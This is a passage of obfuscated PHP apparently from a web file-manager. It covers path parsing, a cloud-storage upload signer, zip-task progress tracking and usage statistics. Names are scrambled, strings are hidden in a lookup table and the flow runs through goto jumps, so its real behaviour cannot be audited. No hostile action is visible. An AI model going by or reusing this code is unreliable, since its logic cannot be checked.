self::KOD_SHARE_LINK, $fåËİË‡‘Ë[1150] => self::KOD_SEARCH, $fåËİË‡‘Ë[1151] => self::KOD_BLOCK, $fåËİË‡‘Ë[1152] => self::KOD_IO, $fåËİË‡‘Ë[1153] => self::KOD_USER_RECENT, $fåËİË‡‘Ë[1154] => self::KOD_USER_DRIVER); } public static function parse($C«ÃåŠæìÕ) { goto BÜ„®ë¾í¥; cš”ƒõäñÍ: $aˆ®¾ôğÅ = array($C¥¶†ó¡Ã[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $c„âø„ÆêĞ[$C¥¶†ó¡Ã[1120]] = in_array($c„âø„ÆêĞ[$C¥¶†ó¡Ã[29]], $aˆ®¾ôğÅ); return $c„âø„ÆêĞ; goto B®…°ƒï¦; ašù•ğŠğ: preg_match($C¥¶†ó¡Ã[1155], $C«ÃåŠæìÕ, $FÊŒí˜´Ş); $c„âø„ÆêĞ = array($C¥¶†ó¡Ã[415] => !1, $C¥¶†ó¡Ã[1156] => !1, $C¥¶†ó¡Ã[412] => !1, $C¥¶†ó¡Ã[76] => $C«ÃåŠæìÕ, $C¥¶†ó¡Ã[1065] => !1, $C¥¶†ó¡Ã[1064] => $C¥¶†ó¡Ã[33]); if (is_array($FÊŒí˜´Ş) && count($FÊŒí˜´Ş) == 5) { $eÅ¨òŞ²»Ö = $C¥¶†ó¡Ã[1157] . $FÊŒí˜´Ş[2] . $C¥¶†ó¡Ã[325]; if (in_array($eÅ¨òŞ²»Ö, $cà§¶Úšòñ)) { $c„âø„ÆêĞ[$C¥¶†ó¡Ã[1065]] = $FÊŒí˜´Ş[1]; $c„âø„ÆêĞ[$C¥¶†ó¡Ã[29]] = $eÅ¨òŞ²»Ö; $c„âø„ÆêĞ[$C¥¶†ó¡Ã[1158]] = substr($eÅ¨òŞ²»Ö, 1, -1); $c„âø„ÆêĞ[$C¥¶†ó¡Ã[393]] = $FÊŒí˜´Ş[3]; } $c„âø„ÆêĞ[$C¥¶†ó¡Ã[1064]] = $FÊŒí˜´Ş[4]; } goto cš”ƒõäñÍ; BÜ„®ë¾í¥: $C¥¶†ó¡Ã =& $_SERVER[œº]; $C«ÃåŠæìÕ = self::clear($C«ÃåŠæìÕ); $cà§¶Úšòñ = array_values(self::typeList()); goto ašù•ğŠğ; B®…°ƒï¦: } public static function isTruePath($bùËô´) { goto bÒ¸ïŠºª‹; D–Ì‘ÎÌéˆ: if (strpos($bùËô´, $c•°ÀÃš‚–[1161]) === 0) { return !0; } return !1; goto D„ğùì„Æø; fÊ‚¤Œ²¶í: if (strpos($bùËô´, $c•°ÀÃš‚–[1124]) === 0) { return !0; } if (strpos($bùËô´, $c•°ÀÃš‚–[1159]) === 0) { return !0; } if (strpos($bùËô´, $c•°ÀÃš‚–[1160]) === 0) { return !0; } goto D–Ì‘ÎÌéˆ; bÒ¸ïŠºª‹: $c•°ÀÃš‚– =& $_SERVER[œº]; if (substr($bùËô´, 0, 1) != $c•°ÀÃš‚–[1157]) { return !0; } if (strpos($bùËô´, $c•°ÀÃš‚–[401]) === 0) { return !0; } goto fÊ‚¤Œ²¶í; D„ğùì„Æø: } public static function clear($f²ÖÍ§ê´) { goto EÂƒİß‘’; e†ÖÆ¡›Ö¯: $EòÓÀà¥­Ù = $f„¬½¬Õä˜[1162]; if (substr($f²ÖÍ§ê´, 0, 3) == $f„¬½¬Õä˜[1163]) { $f²ÖÍ§ê´ = substr($f²ÖÍ§ê´, 3); } while (strstr($f²ÖÍ§ê´, $EòÓÀà¥­Ù)) { $f²ÖÍ§ê´ = str_replace($EòÓÀà¥­Ù, $f„¬½¬Õä˜[8], $f²ÖÍ§ê´); } goto bßÒí¢ƒŞ¥; fã®Ã¶ªˆÎ: return $f²ÖÍ§ê´; goto bÈÎ÷²™é¼; EÂƒİß‘’: $f„¬½¬Õä˜ =& $_SERVER[œº]; $f²ÖÍ§ê´ = str_replace(array($f„¬½¬Õä˜[1038], $f„¬½¬Õä˜[229]), $f„¬½¬Õä˜[50], $f²ÖÍ§ê´); $f²ÖÍ§ê´ = str_replace($f„¬½¬Õä˜[97], $f„¬½¬Õä˜[8], $f²ÖÍ§ê´); goto e†ÖÆ¡›Ö¯; bßÒí¢ƒŞ¥: $f²ÖÍ§ê´ = preg_replace($f„¬½¬Õä˜[1164], $f„¬½¬Õä˜[8], $f²ÖÍ§ê´); if ($f²ÖÍ§ê´ == $f„¬½¬Õä˜[8]) { return $f„¬½¬Õä˜[8]; } $f²ÖÍ§ê´ = rtrim($f²ÖÍ§ê´, $f„¬½¬Õä˜[8]); goto fã®Ã¶ªˆÎ; bÈÎ÷²™é¼: } public static function sourceID($aá”ëÇ«ï) { $aÕŒ”Ş•—Â =& $_SERVER[œº]; $C°ï°›È£‡ = self::parse($aá”ëÇ«ï); if ($C°ï°›È£‡[$aÕŒ”Ş•—Â[29]] !== self::KOD_SOURCE) { show_json(LNG($aÕŒ”Ş•—Â[1165]), !1); } return $C°ï°›È£‡[$aÕŒ”Ş•—Â[393]]; } public static function make($D‘ê¯ä»ô„) { if (!$D‘ê¯ä»ô„) { return !1; } return self::makePath(self::KOD_SOURCE, intval($D‘ê¯ä»ô„)); } public static function makeShare($C·£ê»ùš‹, $dÉ­¼£ÓÈ–) { return self::makePath(self::KOD_SHARE_ITEM, $C·£ê»ùš‹, $dÉ­¼£ÓÈ–); } public static function makeFileTypePath($a¿ Ì©íİö) { return self::makePath(self::KOD_USER_FILE_TYPE, $a¿ Ì©íİö); } public static function makeFileTagPath($eƒËª³Ù¹’) { return self::makePath(self::KOD_USER_FILE_TAG, $eƒËª³Ù¹’); } public static function makePath($FŞ•Ë–§óˆ, $B¬ï«šæ¶³ = '', $b‰Í­ô„• = '') { $f·ÇÍ™Ú =& $_SERVER[œº]; $BÂ¨”Îºé = substr($FŞ•Ë–§óˆ, 1, -1); $CËëÍ®Ûç× = $f·ÇÍ™Ú[1166] . $BÂ¨”Îºé . $f·ÇÍ™Ú[1167] . $B¬ï«šæ¶³ . $f·ÇÍ™Ú[1168]; $CËëÍ®Ûç× = $b‰Í­ô„• ? $CËëÍ®Ûç× . $b‰Í­ô„• . $f·ÇÍ™Ú[8] : $CËëÍ®Ûç×; return $CËëÍ®Ûç×; } public static function hashPath($FÀîÈŞùõ, $A·ïôá²¶¡ = true) { goto fÀ—Ñ³Õº; a¦ïê”³Ë: if (!$DïŒ„–®½Ü && isset($A£¬Öø«¼–[$FÏæëìÚ¦Š[395]])) { $A£¬Öø«¼– = IO::info(KodIO::make($A£¬Öø«¼–[$FÏæëìÚ¦Š[395]])); $DïŒ„–®½Ü = _get($A£¬Öø«¼–, $FÏæëìÚ¦Š[1169], $FÏæëìÚ¦Š[33]); } if (!$DïŒ„–®½Ü && $A·ïôá²¶¡) { $FÏ®è¨Ş–É = KodIO::parse($A£¬Öø«¼–[$FÏæëìÚ¦Š[76]]); if (!$FÏ®è¨Ş–É[$FÏæëìÚ¦Š[29]]) { $DïŒ„–®½Ü = IO::hashSimple($A£¬Öø«¼–[$FÏæëìÚ¦Š[76]]); } } if (!$DïŒ„–®½Ü) { $DïŒ„–®½Ü = md5($A£¬Öø«¼–[$FÏæëìÚ¦Š[76]] . $A£¬Öø«¼–[$FÏæëìÚ¦Š[78]] . $A£¬Öø«¼–[$FÏæëìÚ¦Š[84]]); } goto BµŞ³ö¼÷; fÀ—Ñ³Õº: $FÏæëìÚ¦Š =& $_SERVER[œº]; $A£¬Öø«¼– = is_array($FÀîÈŞùõ) ? $FÀîÈŞùõ : IO::info($FÀîÈŞùõ); $DïŒ„–®½Ü = _get($A£¬Öø«¼–, $FÏæëìÚ¦Š[1169], $FÏæëìÚ¦Š[33]); goto a¦ïê”³Ë; BµŞ³ö¼÷: return $DïŒ„–®½Ü; goto cšÀÅ“°âÅ; cšÀÅ“°âÅ: } public static function initSystemPath() { goto c»›÷„í‘; c»›÷„í‘: $D†óñÍÉ¹ =& $_SERVER[œº]; if (defined($D†óñÍÉ¹[1170])) { return; } define($D†óñÍÉ¹[1170], self::systemPath($D†óñÍÉ¹[1171])); goto a¶Æ¤·ÏÎ; fË÷¦—¹ØÆ: IOHistory::bindEvent(); goto có·ÄÌ²ò³; a¶Æ¤·ÏÎ: define($D†óñÍÉ¹[1172], self::systemPath($D†óñÍÉ¹[1173])); define($D†óñÍÉ¹[1174], self::systemPath($D†óñÍÉ¹[1175])); define($D†óñÍÉ¹[1176], self::systemPath($D†óñÍÉ¹[1177])); goto fË÷¦—¹ØÆ; có·ÄÌ²ò³: } public static function systemPath($b¦œ«†òâ) { goto A¾ëš…Ê…; CçææôãŒ¢: if ($CŸã•¯ƒ´ñ) { return $CŸã•¯ƒ´ñ; } if ($b¦œ«†òâ == $Fƒ®—™î²Ú[1171]) { $CŸã•¯ƒ´ñ = self::make(Model($Fƒ®—™î²Ú[790])->systemRootPathAdd($Fƒ®—™î²Ú[505])); } else { $CŸã•¯ƒ´ñ = self::systemPath($Fƒ®—™î²Ú[1171]); $D´£³ŸØ±ä = self::sourceID($CŸã•¯ƒ´ñ); $CŸã•¯ƒ´ñ = self::make(Model($Fƒ®—™î²Ú[790])->mkdir($D´£³ŸØ±ä, $b¦œ«†òâ)); } Model($Fƒ®—™î²Ú[730])->set($E°îÄªº±†, $CŸã•¯ƒ´ñ); goto CçÁÁ…£à; CçÁÁ…£à: return $CŸã•¯ƒ´ñ; goto b½­ £‹Çß; A¾ëš…Ê…: $Fƒ®—™î²Ú =& $_SERVER[œº]; $E°îÄªº±† = $Fƒ®—™î²Ú[1178] . ucfirst($b¦œ«†òâ); $CŸã•¯ƒ´ñ = Model($Fƒ®—™î²Ú[730])->get($E°îÄªº±†); goto CçææôãŒ¢; b½­ £‹Çß: } public static function systemFolder($DÕˆàè–ÓÛ) { $F¥–ğèã… = IO_PATH_SYSTEM_SOURCE . $DÕˆàè–ÓÛ; $Aì¦— ‹Ù = Cache::get($F¥–ğèã…); if (!$Aì¦— ‹Ù) { $fèáê „³ = IO::infoFull($F¥–ğèã…); if (!$fèáê „³) { $Aì¦— ‹Ù = IO::mkdir($F¥–ğèã…, REPEAT_SKIP); } else { $Aì¦— ‹Ù = $fèáê „³[$_SERVER[œº][76]]; } Cache::set($F¥–ğèã…, $Aì¦— ‹Ù, 3600 * 10); } return $Aì¦— ‹Ù; } public static function defaultDriver() { return Model($_SERVER[œº][727])->defaultDriver(); } public static function defaultIO() { $a‘§ìÏÂ… =& $_SERVER[œº]; $a¤‚Ö…ä¦ = self::defaultDriver(); return $a‘§ìÏÂ…[1179] . $a¤‚Ö…ä¦[$a‘§ìÏÂ…[393]] . $a‘§ìÏÂ…[1168]; } public static function defaultDriverInit() { static $e×ß ç„ß® = false; if ($e×ß ç„ß®) { return $e×ß ç„ß®; } $e×ß ç„ß® = IO::init(self::defaultIO()); return $e×ß ç„ß®; } public static function fileTypeList() { $F¹Ç¦¦ÌÃ‘ =& $_SERVER[œº]; $A”ºâ©»¹† = $GLOBALS[$F¹Ç¦¦ÌÃ‘[6]][$F¹Ç¦¦ÌÃ‘[1180]]; foreach ($A”ºâ©»¹† as $d‰ ãŠÓ©ñ => $FÉ‰›‘Ô²) { $B±ƒÍÓğá = $F¹Ç¦¦ÌÃ‘[1181] . $d‰ ãŠÓ©ñ; $aøÙ©ò—Ú¿ = LNG($B±ƒÍÓğá); if ($B±ƒÍÓğá != $aøÙ©ò—Ú¿) { $A”ºâ©»¹†[$d‰ ãŠÓ©ñ][$F¹Ç¦¦ÌÃ‘[28]] = $aøÙ©ò—Ú¿; } } return $A”ºâ©»¹†; } public static function transferType($E’Êƒô–Â¤, $E…óÑ¯©®‰) { goto d†‰¬²ŸÅ‹; e•»¥•‘µó: if ($cÊ¢ù ìİ[$e¾Öğë’İ[29]] == $cĞµ†ºá¦È[$e¾Öğë’İ[29]] && $cÊ¢ù ìİ[$e¾Öğë’İ[1182]] == $cĞµ†ºá¦È[$e¾Öğë’İ[1182]]) { return $e¾Öğë’İ[1183]; } if ($cÊ¢ù ìİ[$e¾Öğë’İ[29]] == $e¾Öğë’İ[830] && $cĞµ†ºá¦È[$e¾Öğë’İ[29]] == $e¾Öğë’İ[106]) { return $e¾Öğë’İ[1094]; } if ($cÊ¢ù ìİ[$e¾Öğë’İ[29]] == $e¾Öğë’İ[106] && $cĞµ†ºá¦È[$e¾Öğë’İ[29]] == $e¾Öğë’İ[830]) { return $e¾Öğë’İ[107]; } goto F‰“ãÁ’Ãâ; d†‰¬²ŸÅ‹: $e¾Öğë’İ =& $_SERVER[œº]; $cÊ¢ù ìİ = self::driverType($E’Êƒô–Â¤); $cĞµ†ºá¦È = self::driverType($E…óÑ¯©®‰); goto e•»¥•‘µó; F‰“ãÁ’Ãâ: return $e¾Öğë’İ[1184]; goto BØ½Ã«Îİ³; BØ½Ã«Îİ³: } public static function driverType($BÕÜ¡×šõá) { goto CµÇ›Ÿå­³; CµÇ›Ÿå­³: $C¦ÑÇÄº =& $_SERVER[œº]; $A ä–ÓÛ‘ = $BÕÜ¡×šõá->path; $f´†¦„Ô = str_replace($C¦ÑÇÄº[1185], $C¦ÑÇÄº[33], strtolower($BÕÜ¡×šõá->getType())); goto Cåé®µˆô; Cåé®µˆô: if ($f´†¦„Ô == $C¦ÑÇÄº[718] || $f´†¦„Ô == $C¦ÑÇÄº[1186] || $f´†¦„Ô == $C¦ÑÇÄº[1187]) { $BÕÜ¡×šõá = self::defaultDriverInit(); } else { if ($f´†¦„Ô == $C¦ÑÇÄº[1101] || $f´†¦„Ô == $C¦ÑÇÄº[1188]) { $BÕÜ¡×šõá = IO::init($BÕÜ¡×šõá->pathParse[$C¦ÑÇÄº[1048]]); } } $f´†¦„Ô = str_replace($C¦ÑÇÄº[1185], $C¦ÑÇÄº[33], strtolower($BÕÜ¡×šõá->getType())); if ($f´†¦„Ô == $C¦ÑÇÄº[106]) { return array($C¦ÑÇÄº[29] => $C¦ÑÇÄº[106], $C¦ÑÇÄº[1182] => $C¦ÑÇÄº[33], $C¦ÑÇÄº[76] => $A ä–ÓÛ‘); } goto D„šÁ§è¼¯; D„šÁ§è¼¯: return array($C¦ÑÇÄº[29] => $C¦ÑÇÄº[830], $C¦ÑÇÄº[1182] => $BÕÜ¡×šõá->pathDriver, $C¦ÑÇÄº[76] => $A ä–ÓÛ‘); goto CÄÌ ñ·ì¯; CÄÌ ñ·ì¯: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($DÎº°Ò¦Ì) { parent::__construct($DÎº°Ò¦Ì); $this->signatureVersion($_SERVER[œº][212]); } public function uploadFormData($e•ÂŠ´·Æ», $Fœªùá”£Á = 3600) { goto dñ§ößßŸç; féªßğ’óâ: return $c…Ê¦£Á¿¹; goto bœËÏÓ¡å­; dñ§ößßŸç: $Bñµ‹ÑÊâ¢ =& $_SERVER[œº]; $b´±†¿Ğã = $Bñµ‹ÑÊâ¢[192]; $fŒ‡¹Ÿ™Œ = $Bñµ‹ÑÊâ¢[230]; goto Cñä —¼î‹; B¸ƒóºŸ‰©: $fß©ìÉÄÁã = sha1($D¨‹ˆŠª£); $e·ë‘·çˆ = hash_hmac($Bñµ‹ÑÊâ¢[230], $fß©ìÉÄÁã, $Dã´º•ò¹); $c…Ê¦£Á¿¹ = array($Bñµ‹ÑÊâ¢[1193] => $b´±†¿Ğã, $Bñµ‹ÑÊâ¢[1197] => $aªŠµ¡¤¨Ú, $Bñµ‹ÑÊâ¢[1201] => base64_encode($D¨‹ˆŠª£), $Bñµ‹ÑÊâ¢[1198] => $fŒ‡¹Ÿ™Œ, $Bñµ‹ÑÊâ¢[1199] => $this->accessKey, $Bñµ‹ÑÊâ¢[1202] => $F—ÍßŒæëË, $Bñµ‹ÑÊâ¢[1203] => $e·ë‘·çˆ, $Bñµ‹ÑÊâ¢[175] => $this->getHost()); goto féªßğ’óâ; Cñä —¼î‹: $aªŠµ¡¤¨Ú = $Bñµ‹ÑÊâ¢[1189]; $e°ÔÆï = gmdate($Bñµ‹ÑÊâ¢[1190], time() + $Fœªùá”£Á); $F—ÍßŒæëË = (string) time() . $Bñµ‹ÑÊâ¢[68] . (string) (time() + $Fœªùá”£Á); goto D…¢…‡¢æ„; D…¢…‡¢æ„: $D¨‹ˆŠª£ = array($Bñµ‹ÑÊâ¢[1191] => $e°ÔÆï, $Bñµ‹ÑÊâ¢[1192] => array(array($Bñµ‹ÑÊâ¢[1193] => $b´±†¿Ğã), array($Bñµ‹ÑÊâ¢[1194] => $this->bucket), array($Bñµ‹ÑÊâ¢[1195], $Bñµ‹ÑÊâ¢[1196], $Bñµ‹ÑÊâ¢[33]), array($Bñµ‹ÑÊâ¢[1197] => $aªŠµ¡¤¨Ú), array($Bñµ‹ÑÊâ¢[1198] => $fŒ‡¹Ÿ™Œ), array($Bñµ‹ÑÊâ¢[1199] => $this->accessKey), array($Bñµ‹ÑÊâ¢[1200] => $F—ÍßŒæëË))); $D¨‹ˆŠª£ = json_encode($D¨‹ˆŠª£); $Dã´º•ò¹ = hash_hmac($Bñµ‹ÑÊâ¢[230], $F—ÍßŒæëË, $this->secret); goto B¸ƒóºŸ‰©; bœËÏÓ¡å­: } public function fileOutLink($fŞ›ëé­èô) { $c„ÁĞÅ”ğ† =& $_SERVER[œº]; if (substr($fŞ›ëé­èô, 0, 7) == $c„ÁĞÅ”ğ†[1204]) { $fŞ›ëé­èô = $c„ÁĞÅ”ğ†[1205] . substr($fŞ›ëé­èô, 7); } header($c„ÁĞÅ”ğ†[159] . $fŞ›ëé­èô); die; } } goto A‹ŸòÕ¶ƒ×; CÓ‘±áµ÷ˆ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $A‘¡ò×Ğ¤¤ =& $_SERVER[œº]; parent::startAfter(); Hook::bind($A‘¡ò×Ğ¤¤[1616], array($this, $A‘¡ò×Ğ¤¤[1611])); $f„†‡µàà‹ =& $this->task; $f„†‡µàà‹[$A‘¡ò×Ğ¤¤[1613]] = $A‘¡ò×Ğ¤¤[1094]; if (!$f„†‡µàà‹[$A‘¡ò×Ğ¤¤[1432]]) { $f„†‡µàà‹[$A‘¡ò×Ğ¤¤[1432]] = LNG($A‘¡ò×Ğ¤¤[1617]); } } protected function endAfter() { $cÜ´æ¾´Û³ =& $_SERVER[œº]; parent::endAfter(); Hook::unbind($cÜ´æ¾´Û³[1616], array($this, $cÜ´æ¾´Û³[1611])); } public function updateAfter() { $BñŠ…– =& $_SERVER[œº]; $fÃŞ˜©îÒÛ =& $this->task; if (!$fÃŞ˜©îÒÛ[$BñŠ…–[1021]] || !$fÃŞ˜©îÒÛ[$BñŠ…–[723]]) { return; } if ($fÃŞ˜©îÒÛ[$BñŠ…–[1613]] == $BñŠ…–[1094]) { $C‘‰ÂöãÚ‹ = $fÃŞ˜©îÒÛ[$BñŠ…–[1573]]; if ($fÃŞ˜©îÒÛ[$BñŠ…–[1574]] != $BñŠ…–[1094]) { $C‘‰ÂöãÚ‹ = 0; } $a™Åô¸øÅ = ($fÃŞ˜©îÒÛ[$BñŠ…–[1577]] + $C‘‰ÂöãÚ‹) / $fÃŞ˜©îÒÛ[$BñŠ…–[723]]; $fÃŞ˜©îÒÛ[$BñŠ…–[1529]] = $a™Åô¸øÅ * 0.3; } else { if ($fÃŞ˜©îÒÛ[$BñŠ…–[1613]] == $BñŠ…–[311]) { $a™Åô¸øÅ = $fÃŞ˜©îÒÛ[$BñŠ…–[1036]] / $fÃŞ˜©îÒÛ[$BñŠ…–[1021]]; $fÃŞ˜©îÒÛ[$BñŠ…–[1529]] = 0.3 + $a™Åô¸øÅ * 0.5; } else { if ($fÃŞ˜©îÒÛ[$BñŠ…–[1613]] == $BñŠ…–[107]) { $a™Åô¸øÅ = 0; if ($fÃŞ˜©îÒÛ[$BñŠ…–[1572]]) { $a™Åô¸øÅ = $fÃŞ˜©îÒÛ[$BñŠ…–[1573]] / $fÃŞ˜©îÒÛ[$BñŠ…–[1572]]; } $fÃŞ˜©îÒÛ[$BñŠ…–[1529]] = 0.3 + 0.5 + $a™Åô¸øÅ * 0.2; } } } if ($fÃŞ˜©îÒÛ[$BñŠ…–[1529]] > 0) { $e‹ÉÎ¨Éó  = timeFloat() - $fÃŞ˜©îÒÛ[$BñŠ…–[749]] - $fÃŞ˜©îÒÛ[$BñŠ…–[1532]]; $fÃŞ˜©îÒÛ[$BñŠ…–[1533]] = $e‹ÉÎ¨Éó  * (1 - $fÃŞ˜©îÒÛ[$BñŠ…–[1529]]) / $fÃŞ˜©îÒÛ[$BñŠ…–[1529]]; } } public function copyFileStart($CÚ…ÈÖ¦×¥, $D¼²Á‰…×, $ešßù±›ƒ¿, $dÆ×†Íîßâ, $EİøŞ‹¿ê¸, $D«­ò¿¾ã„) { $AÆøã‡’İÜ =& $_SERVER[œº]; parent::copyFileStart($CÚ…ÈÖ¦×¥, $D¼²Á‰…×, $ešßù±›ƒ¿, $dÆ×†Íîßâ, $EİøŞ‹¿ê¸, $D«­ò¿¾ã„); $BÂ²„¦á‰ƒ =& $this->task; if ($BÂ²„¦á‰ƒ[$AÆøã‡’İÜ[1613]] == $AÆøã‡’İÜ[311]) { $BÂ²„¦á‰ƒ[$AÆøã‡’İÜ[1613]] = $AÆøã‡’İÜ[107]; } $this->update(); } public function copyFileEnd($EšÕŠŒºõ¶, $cß¿ôÑë ¬, $Bêˆè‰¸•ô, $BÂí˜„–Ì, $F©è®”šè, $bÀ‹åÀŸ) { $FÛ¹ˆê·àŞ =& $_SERVER[œº]; $E¿‰â¥î£­ =& $this->task; $E¿‰â¥î£­[$FÛ¹ˆê·àŞ[1573]] = $E¿‰â¥î£­[$FÛ¹ˆê·àŞ[1572]]; $E¿‰â¥î£­[$FÛ¹ˆê·àŞ[1577]] += $E¿‰â¥î£­[$FÛ¹ˆê·àŞ[1572]]; $E¿‰â¥î£­[$FÛ¹ˆê·àŞ[1574]] = $FÛ¹ˆê·àŞ[33]; $this->update(); } public function nameParse($a˜“¤¹á­Ù) { $CÒÕ™†æõ =& $_SERVER[œº]; $aõ­Ô»¹Éê =& $this->task; if ($aõ­Ô»¹Éê[$CÒÕ™†æõ[1036]] < $aõ­Ô»¹Éê[$CÒÕ™†æõ[1021]]) { $cïŒó˜çã” = get_path_this($a˜“¤¹á­Ù); if (strstr($cïŒó˜çã”, $CÒÕ™†æõ[95])) { $aõ­Ô»¹Éê[$CÒÕ™†æõ[1036]] += 1; } } if ($aõ­Ô»¹Éê[$CÒÕ™†æõ[1613]] == $CÒÕ™†æõ[1094]) { $aõ­Ô»¹Éê[$CÒÕ™†æõ[1613]] = $CÒÕ™†æõ[311]; } $aõ­Ô»¹Éê[$CÒÕ™†æõ[1570]] = $a˜“¤¹á­Ù; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($D´õÄ’Î ) { $BÂæ´•—Š =& $_SERVER[œº]; $e›åßÕá±î = array($BÂæ´•—Š[562] => array($BÂæ´•—Š[29] => $BÂæ´•—Š[1618], $BÂæ´•—Š[271] => array($BÂæ´•—Š[222], $BÂæ´•—Š[725], $BÂæ´•—Š[1619], $BÂæ´•—Š[1620])), $BÂæ´•—Š[1621] => array($BÂæ´•—Š[29] => $BÂæ´•—Š[1622], $BÂæ´•—Š[271] => array($BÂæ´•—Š[222], $BÂæ´•—Š[723], $BÂæ´•—Š[1623], $BÂæ´•—Š[1624], $BÂæ´•—Š[1625]))); if (!isset($e›åßÕá±î[$D´õÄ’Î ])) { return !1; } $this->optionType = $e›åßÕá±î[$D´õÄ’Î ][$BÂæ´•—Š[29]]; $this->field = $e›åßÕá±î[$D´õÄ’Î ][$BÂæ´•—Š[271]]; return !0; } public function listData($FáŠÜŸ×ñŸ = false, $DÊ¡ÕË¾ = "\x6d\x6f\x64\151\146\171\124\151\x6d\x65", $E‚Š·ÔÍ´ù = false) { return parent::listData($FáŠÜŸ×ñŸ, $DÊ¡ÕË¾, $E‚Š·ÔÍ´ù); } public function trendList($d‹î ‘×¡») { goto eŠø¦Ëƒò³; eŠø¦Ëƒò³: $D…á°¬Ì· =& $_SERVER[œº]; $b‹Ú“¤ò— = $this->listData(); if ($b‹Ú“¤ò—) { $aÁš ™¸Ú = end($b‹Ú“¤ò—); $Bğ±‰ó© = date($D…á°¬Ì·[1626], strtotime($D…á°¬Ì·[1627])); if ($aÁš ™¸Ú[$D…á°¬Ì·[222]] == $Bğ±‰ó©) { return $b‹Ú“¤ò—; } $f÷Ñ•á²İ¾ = strtotime($aÁš ™¸Ú[$D…á°¬Ì·[222]]); } goto fÖ‚²İä‘ì; fÖ‚²İä‘ì: if (!isset($f÷Ñ•á²İ¾)) { $EùŒÈÖ”Šì = $d‹î ‘×¡» == $D…á°¬Ì·[562] ? $D…á°¬Ì·[506] : $D…á°¬Ì·[790]; $f÷Ñ•á²İ¾ = Model($EùŒÈÖ”Šì)->min($D…á°¬Ì·[194]); } $Fô°Õõ˜¥× = $D…á°¬Ì·[1628] . ucfirst($d‹î ‘×¡»); $eÆòà¢ø– = $this->dateList($f÷Ñ•á²İ¾); goto f÷©…ÊÂŒö; f÷©…ÊÂŒö: foreach ($eÆòà¢ø– as $Bğ±‰ó©) { $this->{$Fô°Õõ˜¥×}($Bğ±‰ó©); } return $this->listData(); goto d¹É‡’Ú·; d¹É‡’Ú·: } private function dateList($eó¨³½Òç”) { $eÆ„™÷Íá =& $_SERVER[œº]; $b—¢âËšÍî = $eó¨³½Òç”; $AÇ£šé¦ = strtotime($eÆ„™÷Íá[1627]); $a†ãĞ•æò„ = array(); while ($b—¢âËšÍî <= $AÇ£šé¦) { $a†ãĞ•æò„[] = date($eÆ„™÷Íá[1626], $b—¢âËšÍî); $b—¢âËšÍî = strtotime($eÆ„™÷Íá[1629], $b—¢âËšÍî); } return $a†ãĞ•æò„; } public function _recordUser($D©àÌ¿¸‹¢ = '') { goto DÄó‘¹Í¼ø; bÆÂ“ÀÑÏ²: $d¶ÃÏ«”¤ = array($a¥é“˜µ›é[222] => $D©àÌ¿¸‹¢, $a¥é“˜µ›é[725] => (int) $F·›¢¾¨İ, $a¥é“˜µ›é[1619] => (int) $dóéò‡ØŠ°, $a¥é“˜µ›é[1620] => (int) $D†¨ÔèŠ»Ç); return $this->insert($d¶ÃÏ«”¤); goto A¨¯øÄçÇ¯; fôÖˆ×¶ò‰: $dóéò‡ØŠ° = Model($a¥é“˜µ›é[506])->where($bß¬©õĞ°˜)->count($a¥é“˜µ›é[1528]); $bß¬©õĞ°˜[$a¥é“˜µ›é[29]] = $a¥é“˜µ›é[1632]; $D†¨ÔèŠ»Ç = Model($a¥é“˜µ›é[1633])->where($bß¬©õĞ°˜)->count($a¥é“˜µ›é[1634]); goto bÆÂ“ÀÑÏ²; eÑ´˜Ö¸ä: $bß¬©õĞ°˜ = array($a¥é“˜µ›é[194] => array($a¥é“˜µ›é[970], $aÚ…Š‰¯)); $F·›¢¾¨İ = Model($a¥é“˜µ›é[506])->where($bß¬©õĞ°˜)->count($a¥é“˜µ›é[1528]); $bß¬©õĞ°˜[$a¥é“˜µ›é[194]] = array($a¥é“˜µ›é[331], array($Aœñ°—™¯, $aÚ…Š‰¯)); goto fôÖˆ×¶ò‰; DÄó‘¹Í¼ø: $a¥é“˜µ›é =& $_SERVER[œº]; $Aœñ°—™¯ = strtotime(date($a¥é“˜µ›é[1630], strtotime($D©àÌ¿¸‹¢))); $aÚ…Š‰¯ = strtotime(date($a¥é“˜µ›é[1631], strtotime($D©àÌ¿¸‹¢))); goto eÑ´˜Ö¸ä; A¨¯øÄçÇ¯: } public function _recordStore($eä‰×æ = '') { goto AĞéŞÛ®ß¢; AĞéŞÛ®ß¢: $c‹ÈÎ§»¼† =& $_SERVER[œº]; $e¢—Í®êêà = strtotime(date($c‹ÈÎ§»¼†[1631], strtotime($eä‰×æ))); $b¢è²ÍÍ§÷ = array($c‹ÈÎ§»¼†[194] => array($c‹ÈÎ§»¼†[970], $e¢—Í®êêà)); goto DÇ†”º÷…; Fò‚„˜áğ: $F¯–Ší±š = Model($c‹ÈÎ§»¼†[790])->where($b¢è²ÍÍ§÷)->sum($c‹ÈÎ§»¼†[78]); $a×áµÊÌ‰ = array($c‹ÈÎ§»¼†[222] => $eä‰×æ, $c‹ÈÎ§»¼†[723] => (int) $bô­£‡ì‰Ï, $c‹ÈÎ§»¼†[1623] => (int) $cºØì‚÷ñÊ, $c‹ÈÎ§»¼†[1624] => (int) $FŸ§ä—¶ôÁ, $c‹ÈÎ§»¼†[1625] => (int) $F¯–Ší±š); return $this->insert($a×áµÊÌ‰); goto cä¥¡Ò‘”; DÇ†”º÷…: $cºØì‚÷ñÊ = Model($c‹ÈÎ§»¼†[450])->where($b¢è²ÍÍ§÷)->sum($c‹ÈÎ§»¼†[78]); $b¢è²ÍÍ§÷[$c‹ÈÎ§»¼†[403]] = 0; $bô­£‡ì‰Ï = Model($c‹ÈÎ§»¼†[790])->where($b¢è²ÍÍ§÷)->sum($c‹ÈÎ§»¼†[78]); goto EµÔ…øñÛñ; EµÔ…øñÛñ: $b¢è²ÍÍ§÷[$c‹ÈÎ§»¼†[404]] = 1; $FŸ§ä—¶ôÁ = Model($c‹ÈÎ§»¼†[790])->where($b¢è²ÍÍ§÷)->sum($c‹ÈÎ§»¼†[78]); $b¢è²ÍÍ§÷[$c‹ÈÎ§»¼†[404]] = 2; goto Fò‚„˜áğ; cä¥¡Ò‘”: } public function trend($fã“ªà£Œ, $C›£èš¬…æ) { goto fÏ…îˆÌ˜; fÏ…îˆÌ˜: $EéŞ‰İ£‘› =& $_SERVER[œº]; if (!$this->init($fã“ªà£Œ)) { return !1; } $f¿…Éë”Ò— = $this->trendList($fã“ªà£Œ); goto 